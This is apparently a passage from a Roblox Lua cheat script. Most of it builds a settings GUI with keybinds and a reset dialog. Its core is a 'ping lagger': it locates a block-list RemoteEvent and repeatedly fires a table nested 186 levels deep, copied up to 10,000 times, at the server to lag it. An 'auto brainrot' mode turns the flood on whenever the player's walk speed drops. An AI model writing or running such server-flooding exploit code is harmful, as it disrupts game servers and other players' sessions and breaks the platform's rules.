gpClearBtn.AutoButtonColor  = false
gpClearBtn.Text             = "✕"
gpClearBtn.TextColor3       = C.red
gpClearBtn.Font             = Enum.Font.GothamBlack
gpClearBtn.TextSize         = 10
gpClearBtn.ZIndex           = 23
Instance.new("UICorner", gpClearBtn).CornerRadius = UDim.new(0,6)
local gcs = Instance.new("UIStroke",gpClearBtn); gcs.Color=C.red; gcs.Thickness=1; gcs.Transparency=0.5

gpClearBtn.MouseEnter:Connect(function() tw(gcs,{Transparency=0},0.1) end)
gpClearBtn.MouseLeave:Connect(function() tw(gcs,{Transparency=0.5},0.1) end)
gpClearBtn.MouseButton1Click:Connect(function()
    if listeningFor == "gp" then listeningFor = nil end
    cfg.keybindGp = "None"
    updateKbLabels()
    saveConfig()
end)

-- Reset Button
local resetBtn = Instance.new("TextButton", rightCol)
resetBtn.Size             = UDim2.new(1,-8,0,30)
resetBtn.Position         = UDim2.new(0,4,1,-38)
resetBtn.BackgroundColor3 = C.accent
resetBtn.BackgroundTransparency = 0.15
resetBtn.BorderSizePixel  = 0
resetBtn.AutoButtonColor  = false
resetBtn.Text             = "⟳ RESET"
resetBtn.TextColor3       = C.white
resetBtn.Font             = Enum.Font.GothamBlack
resetBtn.TextSize         = 10
resetBtn.ZIndex           = 22
Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0,7)
local rs = Instance.new("UIStroke", resetBtn); rs.Color=C.accent; rs.Thickness=1.5; rs.Transparency=0.3
resetBtn.MouseEnter:Connect(function() tw(resetBtn,{BackgroundTransparency=0},0.1) end)
resetBtn.MouseLeave:Connect(function() tw(resetBtn,{BackgroundTransparency=0.15},0.1) end)

-- ── UPDATE FUNCTION ──────────────────────────────────────────
local function updateKbLabels()
    if kbBindBtn then
        if listeningFor == "kb" then
            kbBindBtn.Text      = "Press a key..."
            kbBindBtn.TextColor3 = C.waiting
        else
            kbBindBtn.Text      = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
            kbBindBtn.TextColor3 = C.primary3
        end
    end
    if gpBindBtn then
        if listeningFor == "gp" then
            gpBindBtn.Text      = "Press a button..."
            gpBindBtn.TextColor3 = C.waiting
        else
            gpBindBtn.Text      = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
            gpBindBtn.TextColor3 = C.primary3
        end
    end
end

-- ══════════════════════════════════════════════════════════════════════
-- CONFIRM DIALOG
-- ══════════════════════════════════════════════════════════════════════
local confirmBackdrop = Instance.new("Frame")
confirmBackdrop.Name                   = "ConfirmBackdrop"
confirmBackdrop.Size                   = UDim2.new(1,0,1,0)
confirmBackdrop.BackgroundColor3       = Color3.fromRGB(0,0,0)
confirmBackdrop.BackgroundTransparency = 0.5
confirmBackdrop.BorderSizePixel        = 0
confirmBackdrop.Visible                = false
confirmBackdrop.ZIndex                 = 50
confirmBackdrop.Parent                 = screen

local confirmBox = Instance.new("Frame", confirmBackdrop)
confirmBox.Size             = UDim2.new(0,240,0,130)
confirmBox.Position         = UDim2.new(0.5,-120,0.5,-65)
confirmBox.BackgroundColor3 = C.panel
confirmBox.BackgroundTransparency = T.panel
confirmBox.BorderSizePixel  = 0
confirmBox.ZIndex           = 51
Instance.new("UICorner", confirmBox).CornerRadius = UDim.new(0,12)
applyGradient(confirmBox, C.panel, Color3.fromRGB(10,4,22), 160)

local cStroke = Instance.new("UIStroke", confirmBox)
cStroke.Color = C.primary; cStroke.Thickness = 1.5; cStroke.Transparency = 0.2

local confirmLbl = Instance.new("TextLabel", confirmBox)
confirmLbl.Size               = UDim2.new(1,-16,0,60)
confirmLbl.Position           = UDim2.new(0,8,0,8)
confirmLbl.BackgroundTransparency = 1
confirmLbl.Text               = "Reset all settings to defaults?"
confirmLbl.TextWrapped        = true
confirmLbl.TextColor3         = C.white
confirmLbl.Font               = Enum.Font.GothamBold
confirmLbl.TextSize           = 11
confirmLbl.ZIndex             = 52

local confirmYes = Instance.new("TextButton", confirmBox)
confirmYes.Size             = UDim2.new(0,100,0,32)
confirmYes.Position         = UDim2.new(0,8,1,-40)
confirmYes.BackgroundColor3 = C.primary
confirmYes.BorderSizePixel  = 0
confirmYes.AutoButtonColor  = false
confirmYes.Text             = "✓ Confirm"
confirmYes.TextColor3       = C.white
confirmYes.Font             = Enum.Font.GothamBlack
confirmYes.TextSize         = 11
confirmYes.ZIndex           = 52
Instance.new("UICorner", confirmYes).CornerRadius = UDim.new(0,7)
confirmYes.MouseEnter:Connect(function() tw(confirmYes,{BackgroundColor3=C.primary2},0.1) end)
confirmYes.MouseLeave:Connect(function() tw(confirmYes,{BackgroundColor3=C.primary},0.1) end)

local confirmNo = Instance.new("TextButton", confirmBox)
confirmNo.Size             = UDim2.new(0,100,0,32)
confirmNo.Position         = UDim2.new(1,-108,1,-40)
confirmNo.BackgroundColor3 = C.card
confirmNo.BorderSizePixel  = 0
confirmNo.AutoButtonColor  = false
confirmNo.Text             = "✕ Cancel"
confirmNo.TextColor3       = C.dim
confirmNo.Font             = Enum.Font.GothamBold
confirmNo.TextSize         = 11
confirmNo.ZIndex           = 52
Instance.new("UICorner", confirmNo).CornerRadius = UDim.new(0,7)
confirmNo.MouseEnter:Connect(function() tw(confirmNo,{TextColor3=C.white},0.1) end)
confirmNo.MouseLeave:Connect(function() tw(confirmNo,{TextColor3=C.dim},0.1) end)

local function hideConfirm() confirmBackdrop.Visible = false end

confirmNo.MouseButton1Click:Connect(hideConfirm)

confirmYes.MouseButton1Click:Connect(function()
    cfg.power     = DEFAULT_CFG.power
    cfg.interval  = DEFAULT_CFG.interval
    cfg.keybindKb = DEFAULT_CFG.keybindKb
    cfg.keybindGp = DEFAULT_CFG.keybindGp
    cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
    powerBox.Text    = tostring(cfg.power)
    delayBox.Text    = tostring(cfg.interval)
    brainToggle.Text = cfg.autoBrainrot and "ON" or "OFF"
    tw(brainToggle, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(40,10,30)}, 0.15)
    updateKbLabels()
    saveConfig()
    hideConfirm()
end)

resetBtn.MouseButton1Click:Connect(function()
    confirmLbl.Text = "Reset all settings to defaults?"
    confirmBackdrop.Visible = true
end)

-- ══════════════════════════════════════════════════════════════════════
-- SETTINGS OPEN / CLOSE
-- ══════════════════════════════════════════════════════════════════════
local settingsOpen = false

local function openSettings()
    settingsOpen          = true
    settingsFrame.Visible = true
    settingsFrame.Size    = UDim2.new(0,SET_W,0,0)
    tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,SET_H)}, 0.2)
    tw(settingsBtn, {BackgroundColor3=C.primary}, 0.12)
    powerBox.Text    = tostring(cfg.power)
    delayBox.Text    = tostring(cfg.interval)
    brainToggle.Text = cfg.autoBrainrot and "ON" or "OFF"
    brainToggle.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(40,10,30)
    updateKbLabels()
end

local function closeSettings()
    settingsOpen = false
    listeningFor = nil
    updateKbLabels()
    tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,0)}, 0.16)
    task.delay(0.18, function() settingsFrame.Visible = false end)
    tw(settingsBtn, {BackgroundColor3=Color3.fromRGB(0,150,255)}, 0.12)
    hideConfirm()
end

settingsBtn.MouseButton1Click:Connect(function()
    if settingsOpen then closeSettings() else openSettings() end
end)
setCloseBtn.MouseButton1Click:Connect(closeSettings)

-- ══════════════════════════════════════════════════════════════════════
-- PING LAGGER LOGIC
-- ══════════════════════════════════════════════════════════════════════

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local remote
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then remote = r break end
    end
    if not remote then
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and c.Name:find("Block") then remote = c break end
        end
    end
    return remote
end

remote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    local delay = cfg.interval
    while active and remote do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function() remote:FireServer(payload) end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
end

local function flipLag(state, isManual)
    active = state

    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end

    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                flipLag(false)
                return
            end
        end
        updateMainUI(true)
        task.spawn(runPingLoop)
    else
        updateMainUI(false)
    end
end

activateBtn.MouseButton1Click:Connect(function()
    flipLag(not active, true)
end)

-- ══════════════════════════════════════════════════════════════════════
-- AUTO BRAINROT DETECTION
-- ══════════════════════════════════════════════════════════════════════
RunService.Heartbeat:Connect(function()
    if not cfg.autoBrainrot then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
        end
        return
    end

    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end

    local hasBrainrot = hum.WalkSpeed < 25

    if hasBrainrot and not lastBrainrotState then
        brainrotMode = true
        lastBrainrotState = true
        manualOverride = false
        flipLag(true)
    elseif not hasBrainrot and lastBrainrotState then
        brainrotMode = false
        lastBrainrotState = false
        manualOverride = false
        flipLag(false)
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- INPUT HANDLER
-- ══════════════════════════════════════════════════════════════════════
UserInputService.InputBegan:Connect(function(input, processed)
    local kc  = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end

    local isGp = isGamepad(kc)
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard

    if listeningFor then
        if kc == Enum.KeyCode.Escape then
            listeningFor = nil
            updateKbLabels()
            return
        end
        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
            cfg.keybindKb = kc.Name
            listeningFor  = nil
            updateKbLabels()
            saveConfig()
            return
        end
        if listeningFor == "gp" and isGp then
            cfg.keybindGp = kc.Name
            listeningFor  = nil
            updateKbLabels()
            saveConfig()
            return
        end
        return
    end

    if processed then return end

    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        if not mainFrame.Visible then closeSettings() end
        return
    end

    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)

    if (kbEnum and kc == kbEnum and isKb)
    or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active, true)
    end
end)

updateKbLabels()
updateMainUI(false)